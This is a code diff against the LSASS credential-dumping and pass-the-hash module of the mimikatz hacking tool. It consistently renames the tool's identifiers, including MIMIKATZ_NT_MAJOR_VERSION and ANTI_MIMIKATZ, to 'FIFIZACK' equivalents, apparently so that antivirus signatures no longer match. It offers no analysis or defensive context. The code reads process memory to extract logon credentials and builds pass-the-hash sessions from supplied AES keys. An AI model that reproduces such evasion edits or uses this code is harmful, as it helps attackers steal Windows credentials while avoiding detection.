@@ -53,7 +53,7 @@ const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
 	{sizeof(KIWI_MSV1_0_LIST_52), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_52, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_52, LogonServer)},
 	{sizeof(KIWI_MSV1_0_LIST_60), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_60, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_60, LogonServer)},
 	{sizeof(KIWI_MSV1_0_LIST_61), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonServer)},
-	{sizeof(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonServer)},
+	{sizeof(KIWI_MSV1_0_LIST_61_ANTI_FIFIZACK), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_FIFIZACK, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_FIFIZACK, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_FIFIZACK, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_FIFIZACK, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_FIFIZACK, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_FIFIZACK, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_FIFIZACK, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_FIFIZACK, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_FIFIZACK, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_FIFIZACK, LogonServer)},
 	{sizeof(KIWI_MSV1_0_LIST_62), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_62, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonServer)},
 	{sizeof(KIWI_MSV1_0_LIST_63), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_63, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonServer)},
 };
@@ -120,9 +120,9 @@ NTSTATUS kuhl_m_sekurlsa_minidump(int argc, wchar_t * argv[])
 
 NTSTATUS kuhl_m_sekurlsa_init()
 {
-	lsassLocalHelper = (MIMIKATZ_NT_MAJOR_VERSION < 6) ? &lsassLocalHelpers[0] : 
+	lsassLocalHelper = (FIFIZACK_NT_MAJOR_VERSION < 6) ? &lsassLocalHelpers[0] : 
 	#ifdef LSASS_DECRYPT
-		((MIMIKATZ_NT_BUILD_NUMBER != 9431) ? &lsassLocalHelpers[1] : &lsassLocalHelpers[2])
+		((FIFIZACK_NT_BUILD_NUMBER != 9431) ? &lsassLocalHelpers[1] : &lsassLocalHelpers[2])
 	#else
 		&lsassLocalHelpers[1]
 	#endif
@@ -147,7 +147,7 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 	HANDLE hData = NULL;
 	DWORD pid;
 	PMINIDUMP_SYSTEM_INFO pInfos;
-	DWORD processRights = PROCESS_VM_READ | ((MIMIKATZ_NT_MAJOR_VERSION < 6) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION);
+	DWORD processRights = PROCESS_VM_READ | ((FIFIZACK_NT_MAJOR_VERSION < 6) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION);
 	BOOL isError = FALSE;
 
 	if(!cLsass.hLsassMem)
@@ -181,8 +181,8 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 							cLsass.osContext.MinorVersion = pInfos->MinorVersion;
 							cLsass.osContext.BuildNumber  = pInfos->BuildNumber;
 
-							if(isError = (cLsass.osContext.MajorVersion != MIMIKATZ_NT_MAJOR_VERSION) && !(MIMIKATZ_NT_MAJOR_VERSION >= 6 && cLsass.osContext.MajorVersion >= 6))
-								PRINT_ERROR(L"Minidump pInfos->MajorVersion (%u) != MIMIKATZ_NT_MAJOR_VERSION (%u)\n", pInfos->MajorVersion, MIMIKATZ_NT_MAJOR_VERSION);
+							if(isError = (cLsass.osContext.MajorVersion != FIFIZACK_NT_MAJOR_VERSION) && !(FIFIZACK_NT_MAJOR_VERSION >= 6 && cLsass.osContext.MajorVersion >= 6))
+								PRINT_ERROR(L"Minidump pInfos->MajorVersion (%u) != FIFIZACK_NT_MAJOR_VERSION (%u)\n", pInfos->MajorVersion, FIFIZACK_NT_MAJOR_VERSION);
 						#ifdef _M_X64
 							else if(isError = (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64))
 								PRINT_ERROR(L"Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_AMD64 (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_AMD64);
@@ -201,13 +201,13 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 					{
 					#ifdef _M_IX86
 						if(IsWow64Process(GetCurrentProcess(), &isError) && isError)
-							PRINT_ERROR(MIMIKATZ L" " MIMIKATZ_ARCH L" cannot access x64 process\n");
+							PRINT_ERROR(FIFIZACK L" " FIFIZACK_ARCH L" cannot access x64 process\n");
 						else
 					#endif
 						{						
-							cLsass.osContext.MajorVersion = MIMIKATZ_NT_MAJOR_VERSION;
-							cLsass.osContext.MinorVersion = MIMIKATZ_NT_MINOR_VERSION;
-							cLsass.osContext.BuildNumber  = MIMIKATZ_NT_BUILD_NUMBER;
+							cLsass.osContext.MajorVersion = FIFIZACK_NT_MAJOR_VERSION;
+							cLsass.osContext.MinorVersion = FIFIZACK_NT_MINOR_VERSION;
+							cLsass.osContext.BuildNumber  = FIFIZACK_NT_BUILD_NUMBER;
 						}
 					}
 					
@@ -878,7 +878,7 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 
 	if(kull_m_string_args_byName(argc, argv, L"aes128", &szAes128, NULL))
 	{
-		if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
+		if(FIFIZACK_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
 		{
 			if(kull_m_string_stringToHex(szAes128, aes128key, AES_128_KEY_LENGTH))
 			{
@@ -892,7 +892,7 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 
 	if(kull_m_string_args_byName(argc, argv, L"aes256", &szAes256, NULL))
 	{
-		if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
+		if(FIFIZACK_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
 		{
 			if(kull_m_string_stringToHex(szAes256, aes256key, AES_256_KEY_LENGTH))
 			{
